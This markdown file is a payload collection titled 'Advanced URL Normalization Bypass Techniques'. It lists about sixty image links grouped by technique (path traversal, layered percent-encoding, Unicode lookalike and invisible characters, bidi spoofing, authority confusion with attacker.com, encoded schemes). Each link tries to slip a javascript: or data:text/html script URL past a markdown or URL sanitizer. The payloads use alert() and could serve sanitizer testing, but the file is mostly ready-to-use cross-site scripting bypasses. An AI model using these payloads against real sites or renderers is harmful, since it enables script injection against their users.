# Advanced URL Normalization Bypass Techniques

## URL constructor edge cases with malformed input
![test](https://safe.com/\..\javascript:alert('backslash-traverse'))
![test](https://safe.com/\x2e\x2e\x2fjavascript:alert('hex-dots'))
![test](https://safe.com/\u002e\u002e\u002fjavascript:alert('unicode-dots'))

## WHATWG URL parsing inconsistencies
![test](https://safe.com/normal/../\x00javascript:alert('null-after-traverse'))
![test](https://safe.com:80@attacker.com/javascript:alert('auth-port-hijack'))
![test](https://safe.com\x09javascript:alert('tab-injection'))

## URL normalization with mixed separators
![test](https://safe.com\\javascript:alert('backslash-scheme-sep'))
![test](https://safe.com/\\/javascript:alert('mixed-slash-types'))
![test](https://safe.com/normal\x2fjavascript:alert('hex-slash'))

## Percent-encoding normalization bypass
![test](https://safe.com/%2F..%2F..%2Fjavascript:alert('encoded-traverse'))
![test](https://safe.com/%252E%252E%252Fjavascript:alert('double-encode-dots'))
![test](https://safe.com/%25%32%65%25%32%65%25%32%66javascript:alert('triple-encode'))

## Unicode normalization form attacks
![test](https://safe.com/\u002E\u002E\u002Fjavascript:alert('decomposed-dots'))
![test](https://safe.com/︰javascript:alert('presentation-colon'))
![test](https://safe.com/﹕javascript:alert('small-colon'))

## URL with fragment identifier manipulation
![test](https://safe.com/image.jpg#\x00javascript:alert('null-fragment'))
![test](https://safe.com/image.jpg#../../../javascript:alert('fragment-traverse'))
![test](https://safe.com/image.jpg#data:text/html,<script>alert(1)</script>)

## Query parameter injection for bypass
![test](https://safe.com/image.jpg?\x00=javascript:alert('null-param'))  
![test](https://safe.com/image.jpg?../../../evil=javascript:alert('param-traverse'))
![test](https://safe.com/image.jpg?redirect=data:text/html,<script>alert(1)</script>)

## Internationalized Domain Name edge cases
![test](https://ѕafe.com/javascript:alert('cyrillic-s'))
![test](https://safe。com/javascript:alert('ideographic-period'))
![test](https://safe‍.com/javascript:alert('zwj-domain'))

## URL with zero-width and invisible characters
![test](https://safe.com/​javascript:alert('zwsp-path'))
![test](https://safe.com/‌javascript:alert('zwnj-path'))
![test](https://safe.com/‍javascript:alert('zwj-path'))
![test](https://safe.com/javascript:alert('invisible'))

## Protocol confusion with URL constructor
![test](safe.com/javascript:alert('relative-scheme-confusion'))
![test](/\\/javascript:alert('protocol-relative-confusion'))
![test](\\safe.com\\javascript:alert('unc-path-confusion'))

## URL with mathematical alphanumeric symbols  
![test](https://𝓈𝒶𝒻𝑒.𝒸𝑜𝓂/𝒿𝒶𝓋𝒶𝓈𝒸𝓇𝒾𝓅𝓉:𝒶𝓁𝑒𝓇𝓉('math-unicode'))
![test](https://𝖘𝖆𝖋𝖊.𝖈𝖔𝖒/𝖏𝖆𝖛𝖆𝖘𝖈𝖗𝖎𝖕𝖙:𝖆𝖑𝖊𝖗𝖙('fraktur'))

## URL with combining characters disrupting parsing
![test](https://safe.com/java̸script:alert('combining-slash'))
![test](https://safe.com/javascript̰:alert('combining-tilde'))  
![test](https://safe.com/javascript⃣:alert('combining-keycap'))

## URL constructor double-parsing exploitation
![test](https://safe.com/%%6A%61%76%61%73%63%72%69%70%74:alert('double-percent'))
![test](https://safe.com/%25%36%41%61%76%61%73%63%72%69%70%74:alert('meta-hex'))

## Exploit URL normalization order dependencies
![test](https://safe.com/.%2e/.%2e/javascript:alert('mixed-dot-encoding'))
![test](https://safe.com/%252e%252e%252fjavascript:alert('deep-encoding'))

## Malformed URL with constructor fallback exploitation
![test](https://safe.com:99999999999999999999/javascript:alert('port-overflow'))
![test](https://safe.com:-1/javascript:alert('negative-port'))
![test](https://safe.com:0x50/javascript:alert('hex-port'))

## URL with authority-parsing edge cases
![test](https://user@safe.com:pass@attacker.com/javascript:alert('auth-confusion'))
![test](https://safe.com@attacker.com:80/javascript:alert('at-port-confusion'))
![test](https://safe.com#@attacker.com/javascript:alert('fragment-auth'))

## Encoded colon bypass attempts in scheme
![test](https%3A//safe.com/javascript:alert('encoded-scheme-colon'))
![test](javascript%3aalert('full-encoded-scheme'))
![test](java%73cript:alert('partial-encoded-scheme'))

## URL with bidirectional text and scheme confusion
![test](https://safe.com/‮tpircsavaj:alert('bidi-scheme-spoof'))
![test](‮tpircsavaj:alert('full-bidi-scheme'))
![test](https://safe.com/java‮tpircs:alert('partial-bidi'))

## URL constructor with malformed authority
![test](https://[::1@attacker.com]/javascript:alert('ipv6-spoof'))
![test](https://safe.com\@attacker.com/javascript:alert('backslash-at'))
![test](https://safe.com%40attacker.com/javascript:alert('encoded-at'))